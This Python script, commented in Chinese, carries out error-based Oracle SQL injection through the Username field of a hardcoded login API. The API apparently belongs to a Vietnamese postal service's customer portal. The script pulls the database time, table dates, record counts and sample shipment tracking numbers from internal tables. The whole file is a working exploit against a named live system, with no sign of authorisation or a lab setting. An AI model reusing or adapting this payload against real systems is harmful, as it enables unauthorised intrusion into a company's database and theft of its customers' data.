#!/usr/bin/env python3
"""
检查数据库当前日期和最新数据
"""

import requests
import json
import time

class CurrentChecker:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0'
        })
    
    def inject(self, payload):
        data = {"Username": payload, "Password": "test"}
        try:
            return self.session.post(self.target_url, data=json.dumps(data), timeout=30)
        except:
            return None
    
    def extract_via_error(self, query):
        payload = (
            f"'||(SELECT CHR(77) FROM DUAL WHERE 1=1 AND "
            f"1325=CTXSYS.DRITHSX.SN(1325,"
            f"(CHR(113)||CHR(106)||CHR(118)||CHR(106)||CHR(113)||"
            f"({query})||"
            f"CHR(113)||CHR(107)||CHR(118)||CHR(122)||CHR(113))))||'"
        )
        
        response = self.inject(payload)
        if response:
            text = response.text
            try:
                if 'qjvjq' in text and 'qkvzq' in text:
                    start = text.index('qjvjq') + 5
                    end = text.index('qkvzq', start)
                    return text[start:end]
            except:
                pass
        return None
    
    def check_current_date_and_latest(self):
        """检查当前日期和最新数据"""
        print("=" * 80)
        print("🕐 检查数据库当前时间和最新数据")
        print("=" * 80)
        
        # 1. 数据库当前日期
        print(f"\n{'='*80}")
        print("数据库系统时间")
        print(f"{'='*80}")
        
        queries_time = [
            ("当前日期", "SELECT TO_CHAR(SYSDATE,'YYYYMMDD') FROM DUAL"),
            ("当前时间", "SELECT TO_CHAR(SYSDATE,'YYYY-MM-DD HH24:MI:SS') FROM DUAL"),
        ]
        
        current_date = None
        
        for name, query in queries_time:
            result = self.extract_via_error(query)
            if result:
                print(f"  {name}: {result}")
                if name == "当前日期":
                    current_date = result
            time.sleep(1)
        
        # 2. 各表的最新日期
        print(f"\n{'='*80}")
        print("各表最新数据日期")
        print(f"{'='*80}")
        
        queries_max = [
            ("SHIPMENT表", "SELECT MAX(CREATE_DATE) FROM EMS.SHIPMENT"),
            ("E1E2_PH表", "SELECT MAX(NGAY) FROM EMS.E1E2_PH"),
            ("JOURNEYTOKEN表", "SELECT MAX(TOKENDATE) FROM EMS.JOURNEYTOKEN_ZNS"),
            ("TEMP_LOG表", "SELECT MAX(NGAY) FROM EMS.E1E2_PH_TEMP_DATA2_LOG"),
        ]
        
        latest_dates = {}
        
        for name, query in queries_max:
            result = self.extract_via_error(query)
            if result:
                print(f"  {name}: {result}")
                latest_dates[name] = result
            time.sleep(1)
        
        # 3. 如果当前日期有数据，统计
        if current_date:
            print(f"\n{'='*80}")
            print(f"当前日期（{current_date}）的数据统计")
            print(f"{'='*80}")
            
            queries_current = [
                ("SHIPMENT", "EMS.SHIPMENT", "CREATE_DATE"),
                ("E1E2_PH", "EMS.E1E2_PH", "NGAY"),
                ("JOURNEYTOKEN", "EMS.JOURNEYTOKEN_ZNS", "TOKENDATE"),
            ]
            
            for name, table, date_field in queries_current:
                query = f"SELECT COUNT(*) FROM {table} WHERE {date_field}='{current_date}'"
                result = self.extract_via_error(query)
                
                if result:
                    print(f"\n  {name}表:")
                    print(f"    记录数: {result}")
                    
                    # 如果是JOURNEYTOKEN，统计EMS格式
                    if 'JOURNEYTOKEN' in table:
                        time.sleep(1)
                        query2 = f"SELECT COUNT(DISTINCT ITEMCODE) FROM {table} WHERE {date_field}='{current_date}' AND ITEMCODE LIKE 'E%VN'"
                        result2 = self.extract_via_error(query2)
                        if result2:
                            print(f"    EMS运单号: {result2} ⭐")
                
                time.sleep(1)
        
        # 4. 统计最新日期的数据
        print(f"\n{'='*80}")
        print(f"最新日期的EMS运单号统计")
        print(f"{'='*80}")
        
        if 'JOURNEYTOKEN表' in latest_dates:
            latest_date = latest_dates['JOURNEYTOKEN表']
            print(f"\n日期: {latest_date}")
            
            queries_latest = [
                ("总记录数", f"SELECT COUNT(*) FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{latest_date}'"),
                ("独立运单号", f"SELECT COUNT(DISTINCT ITEMCODE) FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{latest_date}'"),
                ("EMS格式(E*VN)", f"SELECT COUNT(DISTINCT ITEMCODE) FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{latest_date}' AND ITEMCODE LIKE 'E%VN'"),
            ]
            
            for name, query in queries_latest:
                result = self.extract_via_error(query)
                if result:
                    print(f"  {name}: {result}")
                time.sleep(1)
            
            # 提取样本
            print(f"\n  样本运单号（前5个）:")
            for i in range(1, 6):
                query = f"SELECT DISTINCT ITEMCODE FROM (SELECT DISTINCT ITEMCODE FROM EMS.JOURNEYTOKEN_ZNS WHERE TOKENDATE='{latest_date}' AND ITEMCODE LIKE 'E%' ORDER BY ITEMCODE) WHERE ROWNUM={i}"
                result = self.extract_via_error(query)
                
                if result and result != 'NULL':
                    print(f"    {i}. {result}")
                
                time.sleep(0.3)
    
    def run(self):
        print("\n🔌 测试连接...")
        response = self.inject("admin")
        if not response:
            print("❌ 无法连接")
            return
        print(f"✅ 连接成功\n")
        
        self.check_current_date_and_latest()
        
        print("\n" + "=" * 80)
        print("✅ 检查完成")
        print("=" * 80)

if __name__ == "__main__":
    target_url = "https://customerconnect.ems.com.vn/api/User_Customer/Login"
    checker = CurrentChecker(target_url)
    checker.run()
